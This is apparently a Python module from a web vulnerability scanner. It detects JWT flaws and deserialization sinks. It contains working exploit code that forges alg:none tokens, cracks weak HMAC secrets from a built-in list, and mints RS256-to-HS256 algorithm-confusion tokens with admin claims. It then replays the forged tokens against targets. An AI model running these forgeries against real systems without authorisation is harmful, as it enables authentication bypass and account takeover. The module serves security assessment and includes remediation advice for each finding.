"""JWT (none/HS crack/alg confusion) and PHP/ViewState deserialization.

Extracted from web.py. Every entry is re-exported through
web/__init__.py's wildcard import so `from recce.services.web import X`
keeps working for the split names too."""
from __future__ import annotations

import base64
import difflib
import hashlib
import hmac
import http.client
import json
import re
import socket
import ssl
import time
from urllib.parse import quote, urlencode, urljoin, urlparse

from ...core.models import Host, Port, Vuln
from .. import probes
from ...core import proxy


# Shared primitives — every probe fetches through _fetch / _mk / etc.
from .http import *  # noqa: F401,F403

__all__ = ['_JWT_RE', '_JWT_COOKIE_RE', '_b64url', '_b64url_enc', '_jwt_alg', '_jwt_candidates', '_forge_none', '_jwt_replay', '_prove_jwt_none', '_JWT_SECRETS', '_HS_HASH', '_jwt_crack_hs', '_forge_hs', '_JWKS_PATHS', '_der_len', '_der', '_der_uint', '_rsa_pubkey_pem', '_b64url_uint', '_fetch_jwks_pubkey', '_forge_alg_confusion', '_replay_forged', '_scan_jwts', '_PHP_SER', '_VIEWSTATE', '_scan_deserial']


_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*")


_JWT_COOKIE_RE = re.compile(
    r"([A-Za-z0-9_.\-]+)=(eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*)")




def _b64url(seg: str):
    try:
        return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))
    except Exception:  # noqa: BLE001
        return None




def _b64url_enc(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()




def _jwt_alg(token: str):
    raw = _b64url(token.split(".", 1)[0])
    if not raw:
        return None
    try:
        return str(json.loads(raw).get("alg", "")).lower()
    except Exception:  # noqa: BLE001
        return None




def _jwt_candidates(headers: dict, body: str):
    """Every JWT in the response, tagged with where it lives so we can replay it:
    ('cookie', name, tok) / ('authorization', None, tok) / ('body', None, tok)."""
    out, seen = [], set()
    for m in _JWT_COOKIE_RE.finditer(headers.get("set-cookie", "")):
        name, tok = m.group(1), m.group(2)
        if tok not in seen:
            seen.add(tok)
            out.append(("cookie", name, tok))
    for tok in _JWT_RE.findall(headers.get("authorization", "")):
        if tok not in seen:
            seen.add(tok)
            out.append(("authorization", None, tok))
    for tok in _JWT_RE.findall(body):
        if tok not in seen:
            seen.add(tok)
            out.append(("body", None, tok))
    return out




def _forge_none(token: str):
    """alg:none forgery of `token`: keep the original claims, add a harmless marker so
    that a server ACCEPTING it proves it never checked the signature (we changed the
    payload). Returns the forged compact JWT (empty signature) or None."""
    parts = token.split(".")
    if len(parts) < 2:
        return None
    payraw = _b64url(parts[1])
    if payraw is None:
        return None
    try:
        claims = json.loads(payraw)
    except Exception:  # noqa: BLE001
        return None
    if not isinstance(claims, dict):
        return None
    claims = dict(claims)
    claims["recce_probe"] = 1        # innocuous, non-authorization marker
    head = _b64url_enc(b'{"alg":"none","typ":"JWT"}')
    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
    return f"{head}.{pay}."




def _jwt_replay(ip: str, port: Port, path: str, loc: str, cookie_name, token):
    """Fetch `path` presenting `token` in the location it was observed in. token=None
    fetches anonymously (the logged-out baseline)."""
    if token is None:
        return _fetch(ip, port, path)
    if loc == "cookie" and cookie_name:
        return _fetch(ip, port, path, auth={"Cookie": f"{cookie_name}={token}"})
    return _fetch(ip, port, path, auth={"Authorization": f"Bearer {token}"})




def _prove_jwt_none(ip: str, port: Port, path: str, loc: str, cookie_name, token: str):
    """Actively prove the server accepts a forged alg:none token. Returns
    (verdict, evidence) where verdict is confirmed/rejected/inconclusive, or None if
    the proof could not run."""
    forged = _forge_none(token)
    if not forged:
        return None
    authed = _jwt_replay(ip, port, path, loc, cookie_name, token)
    anon = _jwt_replay(ip, port, path, loc, cookie_name, None)
    frg = _jwt_replay(ip, port, path, loc, cookie_name, forged)
    if not (authed and anon and frg):
        return None
    where = f"cookie {cookie_name}" if loc == "cookie" else "Authorization: Bearer"
    lens = (f"authed=HTTP {authed[0]}/{len(authed[2])}B  anon=HTTP {anon[0]}/{len(anon[2])}B  "
            f"forged=HTTP {frg[0]}/{len(frg[2])}B")
    if _resp_same(authed, anon):
        return ("inconclusive",
                f"GET {path} returned the same response with the real token, with no token, "
                f"and with the forged alg:none token ({lens}) - the endpoint isn't gated by "
                f"this token, so acceptance can't be proven here. Replay against a "
                f"token-gated path with jwt_tool -X a.")
    if _resp_same(frg, authed):
        return ("confirmed",
                f"Forged an unsigned token (header alg:none, original claims + a marker) and "
                f"replayed it via {where} against {path}. The server returned the same "
                f"authenticated response as the real token, and a different one with no token "
                f"({lens}) - the signature is not verified, so tokens are forgeable with any "
                f"claims (privilege escalation, account takeover).")
    if _resp_same(frg, anon):
        return ("rejected",
                f"Forged alg:none token replayed via {where} against {path} was treated like "
                f"no token at all ({lens}) - the server rejects unsigned tokens on this path.")
    return ("inconclusive",
            f"Forged alg:none token produced a distinct response from both the authenticated "
            f"and anonymous baselines ({lens}); couldn't classify. Confirm with jwt_tool -X a.")


_JWT_SECRETS = [
    "secret", "secretkey", "secret_key", "jwt_secret", "jwtsecret", "jwt", "key",
    "password", "changeme", "change_me", "admin", "test", "123456", "1234567890",
    "qwerty", "supersecret", "super_secret", "mysecret", "my_secret", "s3cr3t",
    "secret123", "password123", "default", "your-256-bit-secret", "your-secret-key",
    "your_jwt_secret", "topsecret", "letmein", "private", "token", "auth", "hmac",
    "signingkey", "signing_key", "app_secret", "appsecret", "sekret", "secretsecret",
    "access_token_secret", "refresh_token_secret", "0000", "null", "undefined",
]


_HS_HASH = {"hs256": hashlib.sha256, "hs384": hashlib.sha384, "hs512": hashlib.sha512}




def _jwt_crack_hs(token: str, extra_secrets=None) -> str | None:
    """Offline HMAC brute of an HS* JWT against the built-in list (+ any extra secrets,
    e.g. engagement-harvested). Returns the signing secret if found, else None. The
    HMAC check is exact, so a hit IS the secret - no false positive."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    h = _HS_HASH.get(_jwt_alg(token) or "")
    if h is None:
        return None
    sig = _b64url(parts[2])
    if not sig:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    for secret in list(_JWT_SECRETS) + list(extra_secrets or []):
        if not secret:
            continue
        if hmac.compare_digest(hmac.new(secret.encode(), signing_input, h).digest(), sig):
            return secret
    return None




def _forge_hs(token: str, secret: str, extra_claims: dict) -> str | None:
    """Forge a token from `token`'s claims (+ extra_claims) signed with `secret` - a
    ready proof that the recovered secret grants arbitrary tokens."""
    parts = token.split(".")
    alg = _jwt_alg(token) or "hs256"
    h = _HS_HASH.get(alg)
    payraw = _b64url(parts[1]) if len(parts) > 1 else None
    if h is None or payraw is None:
        return None
    try:
        claims = json.loads(payraw)
    except (ValueError, TypeError):
        return None
    if not isinstance(claims, dict):
        return None
    claims = {**claims, **extra_claims}
    head = _b64url_enc(json.dumps({"alg": alg.upper(), "typ": "JWT"},
                                  separators=(",", ":")).encode())
    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
    sig = _b64url_enc(hmac.new(secret.encode(), f"{head}.{pay}".encode(), h).digest())
    return f"{head}.{pay}.{sig}"


_JWKS_PATHS = ["/.well-known/jwks.json", "/jwks.json", "/jwks", "/oauth2/jwks",
               "/oauth/jwks", "/api/jwks", "/.well-known/openid-configuration"]




def _der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b




def _der(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(content)) + content




def _der_uint(x: int) -> bytes:
    b = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
    if b[0] & 0x80:
        b = b"\x00" + b                       # keep it a positive INTEGER
    return _der(0x02, b)




def _rsa_pubkey_pem(n: int, e: int) -> str:
    """Reconstruct the SubjectPublicKeyInfo PEM for an RSA public key from (n, e) -
    the exact bytes a JWT library uses as the HMAC key in an alg-confusion attack."""
    rsa = _der(0x30, _der_uint(n) + _der_uint(e))                 # RSAPublicKey (PKCS#1)
    alg = _der(0x30, _der(0x06, bytes.fromhex("2a864886f70d010101")) + _der(0x05, b""))
    spki = _der(0x30, alg + _der(0x03, b"\x00" + rsa))            # SubjectPublicKeyInfo
    b64 = base64.b64encode(spki).decode()
    lines = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return f"-----BEGIN PUBLIC KEY-----\n{lines}\n-----END PUBLIC KEY-----\n"




def _b64url_uint(s: str) -> int:
    return int.from_bytes(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)), "big")




def _fetch_jwks_pubkey(ip: str, port: Port, auth) -> str | None:
    """Find the server's RSA public key (JWKS / OIDC discovery) and return it as a PEM."""
    for path in _JWKS_PATHS:
        r = _fetch(ip, port, path, auth=auth)
        if not r or r[0] != 200 or not r[2]:
            continue
        try:
            d = json.loads(r[2])
        except (ValueError, TypeError):
            continue
        if isinstance(d, dict) and d.get("jwks_uri"):             # OIDC discovery -> jwks
            rr = _fetch(ip, port, urlparse(d["jwks_uri"]).path or "/", auth=auth)
            if rr and rr[0] == 200:
                try:
                    d = json.loads(rr[2])
                except (ValueError, TypeError):
                    continue
        keys = d.get("keys") if isinstance(d, dict) else None
        if not isinstance(keys, list):
            continue
        for k in keys:
            if isinstance(k, dict) and k.get("kty") == "RSA" and k.get("n") and k.get("e"):
                try:
                    return _rsa_pubkey_pem(_b64url_uint(k["n"]), _b64url_uint(k["e"]))
                except (ValueError, TypeError):
                    continue
    return None




def _forge_alg_confusion(token: str, pem: str) -> str | None:
    """Forge an HS256 token (escalated claims) signed with the RSA public-key PEM as the
    HMAC secret - what a server that accepts HS256 with the same key would validate."""
    parts = token.split(".")
    payraw = _b64url(parts[1]) if len(parts) > 1 else None
    if payraw is None:
        return None
    try:
        claims = json.loads(payraw)
    except (ValueError, TypeError):
        return None
    if not isinstance(claims, dict):
        return None
    claims = {**claims, "admin": True, "role": "admin", "recce": 1}
    head = _b64url_enc(json.dumps({"alg": "HS256", "typ": "JWT"},
                                  separators=(",", ":")).encode())
    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
    sig = _b64url_enc(hmac.new(pem.encode(), f"{head}.{pay}".encode(),
                               hashlib.sha256).digest())
    return f"{head}.{pay}.{sig}"




def _replay_forged(ip: str, port: Port, path: str, loc: str, cookie_name, real, forged):
    """Replay a forged token vs the real token vs no token. Returns confirmed / rejected /
    inconclusive, or None if the probes failed."""
    authed = _jwt_replay(ip, port, path, loc, cookie_name, real)
    anon = _jwt_replay(ip, port, path, loc, cookie_name, None)
    frg = _jwt_replay(ip, port, path, loc, cookie_name, forged)
    if not (authed and anon and frg):
        return None
    if _resp_same(authed, anon):
        return "inconclusive"
    if _resp_same(frg, authed):
        return "confirmed"
    if _resp_same(frg, anon):
        return "rejected"
    return "inconclusive"




def _scan_jwts(ip: str, port: Port, headers: dict, body: str,
               active: bool = False) -> list[Vuln]:
    out: list[Vuln] = []
    seen_alg: set[str] = set()
    for loc, cookie_name, tok in _jwt_candidates(headers, body):
        alg = _jwt_alg(tok)
        if alg is None:
            continue
        red = f"{tok[:12]}…{tok[-6:]}"
        if alg == "none":
            proof = _prove_jwt_none(ip, port, "/", loc, cookie_name, tok) if active else None
            if proof and proof[0] == "confirmed":
                out.append(_mk(ip, port, "web-jwt", "high",
                               "JWT alg:none accepted - forged unsigned token (proven)",
                               ["CWE-347"], proof[1],
                               "Reject 'none'; pin the expected algorithm server-side.",
                               confidence="confirmed"))
                continue
            if proof and proof[0] == "rejected":
                out.append(_mk(ip, port, "web-jwt", "info",
                               "JWT issued with alg:none (but forged token rejected)",
                               ["CWE-347"], proof[1],
                               "Stop issuing alg:none tokens; pin the algorithm.",
                               confidence="potential"))
                continue
            note = (f"A JWT with header alg=none was observed ({red}). If the server verifies "
                    "it, tokens can be forged with any claims.")
            if proof:
                note += "  " + proof[1]
            out.append(_mk(ip, port, "web-jwt", "high",
                           "JWT accepts 'alg:none' (unsigned - forgeable)", ["CWE-347"],
                           note, "Reject 'none'; pin the expected algorithm server-side.",
                           confidence="potential"))
            continue
        if alg in seen_alg:      # de-dupe the algorithmic notes (one per alg family)
            continue
        seen_alg.add(alg)
        if alg.startswith("hs"):
            cracked = _jwt_crack_hs(tok)
            if cracked:
                forged = _forge_hs(tok, cracked, {"admin": True, "role": "admin",
                                                  "recce": 1})
                pocline = (f"  Forged admin token (verify with the same secret): {forged}"
                           if forged else "")
                out.append(_mk(
                    ip, port, "web-jwt", "critical",
                    f"JWT HMAC secret cracked ('{cracked}') - forge arbitrary tokens",
                    ["CWE-347", "CWE-1391"],
                    f"The {alg.upper()} JWT ({red}) is signed with the weak secret "
                    f"'{cracked}', recovered by offline HMAC brute force. With the secret "
                    "an attacker forges ANY token - set admin/other-user claims for a "
                    "complete authentication bypass / privilege escalation." + pocline,
                    "Use a long random secret (>=32 random bytes) or an asymmetric "
                    "algorithm (RS256); rotate the compromised secret and invalidate "
                    "issued tokens.", confidence="confirmed"))
            else:
                out.append(_mk(ip, port, "web-jwt", "low",
                               f"JWT uses symmetric {alg.upper()} (offline-crackable secret)",
                               ["CWE-347"],
                               f"JWT header alg={alg.upper()} ({red}). The built-in weak-secret "
                               "list didn't crack it; try a full wordlist (hashcat -m 16500 / "
                               "jwt_tool). A weak HMAC secret lets you forge tokens.",
                               "Use a long random secret (or RS256); rotate it.",
                               confidence="potential"))
        elif alg.startswith(("rs", "es", "ps")):
            pem = _fetch_jwks_pubkey(ip, port, None) if alg.startswith("rs") else None
            forged = _forge_alg_confusion(tok, pem) if pem else None
            if forged:
                verdict = None
                if active:
                    verdict = _replay_forged(ip, port, "/", loc, cookie_name, tok, forged)
                if verdict == "confirmed":
                    out.append(_mk(ip, port, "web-jwt", "critical",
                                   "JWT RS256->HS256 algorithm confusion (forged token accepted)",
                                   ["CWE-347"],
                                   f"The {alg.upper()} JWT ({red}) - recce recovered the RSA "
                                   "public key from the server's JWKS, forged an HS256 token "
                                   "signed with that public key, and the server ACCEPTED it "
                                   "(same authenticated response as the real token). Tokens "
                                   f"are forgeable with any claims.\n\nForged admin token: {forged}",
                                   "Pin the expected algorithm server-side; never accept HS* "
                                   "when the key is an RSA public key.", confidence="confirmed"))
                elif verdict != "rejected":
                    out.append(_mk(ip, port, "web-jwt", "high",
                                   "JWT RS256->HS256 algorithm-confusion (forged token minted)",
                                   ["CWE-347"],
                                   f"The {alg.upper()} JWT ({red}) - recce recovered the RSA "
                                   "public key from the server's JWKS and minted an HS256 token "
                                   "signed with it. If the server verifies HS* with the same "
                                   "key it accepts this (auth bypass / privilege escalation); "
                                   f"replay it on a token-gated path to confirm.\n\nForged token: {forged}",
                                   "Pin the algorithm server-side; never accept HS* with the "
                                   "RSA public key.", confidence="potential"))
            else:
                out.append(_mk(ip, port, "web-jwt", "info",
                               f"JWT uses {alg.upper()} (check RS256->HS256 key-confusion)",
                               ["CWE-347"],
                               f"JWT header alg={alg.upper()} ({red}). Test the algorithm-"
                               "confusion attack (sign with the public key as an HS256 secret).",
                               "Pin the algorithm; don't accept alg switching.",
                               confidence="potential"))
    return out


_PHP_SER = re.compile(r'O:\d{1,3}:"[\w\\]{1,64}":\d+:\{')


_VIEWSTATE = re.compile(r'name="__VIEWSTATE"[^>]*\svalue="([^"]+)"', re.I)




def _scan_deserial(ip: str, port: Port, headers: dict, body: str) -> list[Vuln]:
    """Flag serialized-object markers in cookies / hidden fields: a Java serialized
    stream, a PHP serialized object, or an unencrypted ASP.NET ViewState - each is a
    deserialization sink reachable with attacker-controlled input."""
    out: list[Vuln] = []
    cookies = headers.get("set-cookie", "")
    hay = cookies + "\n" + (body or "")
    # Java: base64 of the stream magic AC ED 00 05 ("rO0AB..."), or the raw magic itself.
    if "rO0AB" in hay or "\xac\xed\x00\x05" in hay:
        where = "Set-Cookie" if ("rO0AB" in cookies or "\xac\xed\x00\x05" in cookies) else "response body"
        out.append(_mk(ip, port, "web-deserial", "high",
            "Java serialized object in client-controllable data", ["CWE-502"],
            f"A Java serialized stream (magic AC ED 00 05 / 'rO0AB' base64) appears in the "
            f"{where}. If the server deserializes it, a ysoserial gadget chain yields RCE.",
            "Never deserialize untrusted input; use a look-ahead ObjectInputStream allow-list "
            "or a data-only format (JSON)."))
    m = _PHP_SER.search(cookies) or _PHP_SER.search(body or "")
    if m:
        where = "Set-Cookie" if _PHP_SER.search(cookies) else "response body"
        out.append(_mk(ip, port, "web-deserial", "high",
            "PHP serialized object in client-controllable data", ["CWE-502"],
            f"A PHP serialized object ({m.group(0)[:48]}...) appears in the {where}. If it is "
            "unserialize()d, a POP gadget chain (PHPGGC) can inject objects / reach RCE.",
            "Do not unserialize() attacker input; use json_decode, or restrict allowed_classes."))
    vs = _VIEWSTATE.search(body or "")
    if vs:
        try:
            raw = base64.b64decode(vs.group(1) + "===")
        except Exception:
            raw = b""
        if raw[:2] == b"\xff\x01":            # LOSFormatter marker => not encrypted
            out.append(_mk(ip, port, "web-deserial", "medium",
                "ASP.NET ViewState is not encrypted", ["CWE-502"],
                "__VIEWSTATE decodes to the unencrypted LOSFormatter marker (FF 01). If MAC "
                "is also disabled (EnableViewStateMac=false) or the machineKey leaks, ViewState "
                "is a .NET deserialization RCE sink (ysoserial.net ViewState).",
                "Keep EnableViewStateMac on, encrypt ViewState, and protect the machineKey."))
    return out
